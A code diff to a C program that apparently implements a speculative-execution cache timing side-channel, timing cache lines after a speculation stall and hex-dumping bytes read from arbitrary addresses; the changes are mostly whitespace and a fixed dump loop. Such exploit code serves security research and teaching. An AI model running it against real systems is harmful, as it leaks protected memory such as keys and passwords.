@@ -248,7 +248,7 @@ void collect_stats(channel *ch, void *addr)
 #ifdef POISON
 	ch->pointers[POISON_LEN] = addr;
 #endif
-	
+
 	for(int line = 0; line < 256; line++)
 	{
 		for(int i = 0; i < ITERATIONS; i++)
@@ -263,7 +263,7 @@ void collect_stats(channel *ch, void *addr)
 			//if(!setjmp(restore))
 			stall_speculate(addr, ch->mapping);
 #endif
-		
+
 			unsigned long long t = time_read(ch->mapping[line]);
 			if(t / TIME_BUCKET < TIME_DIVS)
 				timing[line][t / TIME_BUCKET]++;
@@ -313,7 +313,7 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 #ifdef POISON
 	ch->pointers[POISON_LEN] = addr;
 #endif
-	
+
 	for(int line = 0; line < 256; line++)
 	{
 		for(int i = 0; i < ITERATIONS; i++)
@@ -328,7 +328,7 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 			//if(!setjmp(restore))
 			stall_speculate(addr, ch->mapping);
 #endif
-		
+
 			unsigned long long t = time_read(ch->mapping[line]);
 			(t < cutoff_time ? hit_timing : miss_timing)[line]++;
 		}
@@ -338,7 +338,7 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 	for(int line = 1; line < 256; line++)
 		if(max_line == 0 ? hit_timing[line] > 0 : hit_timing[line] > hit_timing[max_line])
 			max_line = line;
-	
+
 	if(max_line)
 	{
 		*uncertainty = pow(PROB_HIT_ACCIDENTAL, hit_timing[max_line]);
@@ -447,42 +447,28 @@ int main(int argc, char *argv[])
 	{
 		printf("%p | ", addr + ln * 16);
 
-		int endianize[50] = { 0 };
+		unsigned char endianize[16];
 		for(int p = 0; p < 16; p++)
 		{
-		  //dbg printf("%s", "instantiating buffer\n");
 		  int val = read_byte(&ch, addr + ln * 16 + p, 1);
-		  if(val == -1) {
-		    printf("?? ");
+		  if(val < 0) {
+		    printf("cannot read position %d\n", p);
 		  }
 		  else {
-		    //should hit this
-		    endianize[p] = val;
+		    endianize[p] = (char)val;
 		  }
 		}
 
-		int x;
-		for (x = 16; x >= 1; --x)
+		for (int x = 15; x >= 0; --x)
 		{
-
-		  
+    	  printf("%02x", endianize[x]);
 		  if(x == 8) {
-		    printf("%02x ", endianize[x]);
+		    printf(" ");
 		  }
-		  else if (x == 0) {
-		    
-		  }
-		  else {
-		    printf("%02x", endianize[x]);
-		  }
-		      
 		}
 		printf("\n");
-		//fflush(stdout);
 		memset(&endianize[0], 0, sizeof(endianize));
 	}
-		//printf("\nClearing buffer\n");
-		//printf("%x", endianize);
 #endif
 #endif
 }
